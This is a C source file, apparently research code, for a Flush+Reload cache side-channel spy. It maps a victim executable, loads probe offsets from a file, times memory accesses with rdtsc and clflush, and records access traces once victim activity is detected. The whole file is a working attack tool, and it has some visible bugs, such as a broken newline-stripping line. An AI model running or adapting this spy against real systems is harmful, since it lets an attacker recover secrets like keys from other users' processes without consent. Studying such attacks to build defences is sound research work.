#include <fcntl.h> // TODO remove unneeded libs
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>


#define THRESHOLD (int) 120
#define CYCLE_AMOUNT (int) 200000

//#define MEASUREMENT_THRESHOLD // toggle for 0/1 measurements
#define TESTEXEC_UBUNTU

typedef struct node {
    char *adrs;
    struct node *next;
} node_t;

typedef struct adresses{
    int amount;
    node_t *probe_adresses;
}adresses_t;

char *probe_path = "/home/jia/Documents/flush-reload/probe_adresses";
// probe from paper
int probe_treshold(char *adrs)
{
    volatile unsigned long time;
    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"); 
    return time < THRESHOLD; 
}

int probe_precise(char *adrs)
{
    volatile unsigned long time;    
    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time; 
}

int probe(char *adrs)
{
#ifndef MEASUREMENT_THRESHOLD
    return probe_precise(adrs);
#else
    return probe_treshold(adrs);
#endif
}

// spy process probing certain memory addresses
// https://stackoverflow.com/questions/13772567/how-to-get-the-cpu-cycle-count-in-x86-64-from-c
static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ ("rdtsc" : "=A" (x));
    return x;
}

// write measurements to file
void writer(char **target_adrs, int adrs_amount, unsigned int measurements[][CYCLE_AMOUNT])
{
    char name_buf[50];
    char result_buf[20];
    unsigned long long now = rdtsc();
    for(int i = 0; i<adrs_amount; i++)
    {
        char *ptr = target_adrs[i];
        sprintf(name_buf, "measurements/exp_%lld_%d_%p.txt", now, i, ptr);
        FILE *file = fopen(name_buf, "w");
        if (file == NULL)
        {
            printf("Failed to open the file (fopen).\n");
            exit(EXIT_FAILURE); // Exit
        }
        for (int j=0; j<CYCLE_AMOUNT; j++)
        {
            sprintf(result_buf, "%d\n", measurements[i][j]);
            fputs(result_buf, file);
        }
        fclose(file);
    }
}

// load probe adresses from file
adresses_t *file_loader(char *file_path)
{
    FILE *fp = fopen(file_path, "r");
    char *line = NULL;
    size_t len = 0;
    ssize_t read;

    if (fp == NULL)
    {
        perror("Error reading adress file (fopen)!\n");
        exit(EXIT_FAILURE);
    }
    
    // init linked list
    node_t *node_head;
    node_t *node_current;
    int head_set = 1;
    int adrs_counter = 0;

    // https://linux.die.net/man/3/getline
    // read line for line and parse linewise read string to pointers
    while ((read = getline(&line, &len, fp)) != -1) {
        node_t *node_new = (node_t *) malloc(sizeof(node_t));
        (&line)[strlen(line)-1] = "\0"; //delete "\n"
        node_new->adrs = (char *)strtol(line, NULL, 16); // make read string to pointer
        if (head_set)
        {
            node_head = node_new;
            node_current = node_head;
            head_set = 0;
        } else {
            node_current->next = node_new;
            node_current = node_new;
        }
        adrs_counter++;        
    }
    node_current->next = NULL;

    fclose(fp);
    free(line);

    // insert values to return struct
    adresses_t *adresses = (adresses_t *) malloc(sizeof(adresses_t));
    adresses->amount = adrs_counter;
    adresses->probe_adresses = node_head;
    return adresses;
}

// spy (actual attack/monitoring)
void spy(char **target_adrs, int adrs_amount)
{
    unsigned long long old_tsc, tsc = rdtsc();
    unsigned int measurements[adrs_amount][CYCLE_AMOUNT]; // results
    for(int cur_slot = 0; cur_slot<CYCLE_AMOUNT; cur_slot++)
    {
        // update time stamps
        old_tsc = tsc;
        tsc = rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            tsc = rdtsc();
        }
        for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
        {
            char *ptr=target_adrs[cur_adr_i];
            measurements[cur_adr_i][cur_slot]=probe(ptr);                                         
        }
    }
    writer(target_adrs, adrs_amount, measurements); // write results to file
    printf("Spy finished!\n");
}

// detect/wait for victim activity
void lurk(void *base, char **target_adrs, int adrs_amount)
{
    unsigned long long old_tsc, tsc = rdtsc();
    while(1)
    {
        old_tsc = tsc;
        tsc=rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            tsc = rdtsc();
        }
        bool detected = probe_treshold(base);
        if (detected)
        {
            printf("Detected victim activity - starting spy\n");
            spy(target_adrs, adrs_amount);
	    printf("Finished monitoring - waiting for victim activity ...\n");
        }
    }
}

void control()
{
    FILE *file_pointer = fopen("/home/jia/Documents/flush-reload/victim", "r"); // hard coded path to open the executable used by the victim 
    int file_descriptor = fileno(file_pointer);     
    struct stat st_buf;
    fstat(file_descriptor, &st_buf);
    int map_len = st_buf.st_size;
    void *base = mmap(NULL, map_len, PROT_READ, MAP_SHARED, file_descriptor, 0);
    
    if (base == MAP_FAILED) {
        perror("mmap failed!");
        exit(EXIT_FAILURE);
    }

    #ifdef TESTEXEC_UBUNTU
    adresses_t *targets = file_loader(probe_path); // load probe adrs
    #endif

    char *target_adrs[targets->amount];
    node_t *node_current = targets->probe_adresses;
    for (int i= 0; i<targets->amount; i++)
    {
        target_adrs[i] = (char *) ((unsigned long) node_current->adrs + (unsigned long) base);
        node_current = node_current->next;
    }
    lurk(base, target_adrs, targets->amount);
    munmap(base, map_len); // this will never be reached
}

int main()
{
    printf("starting\n");
    control();   
    printf("finished\n");   
}
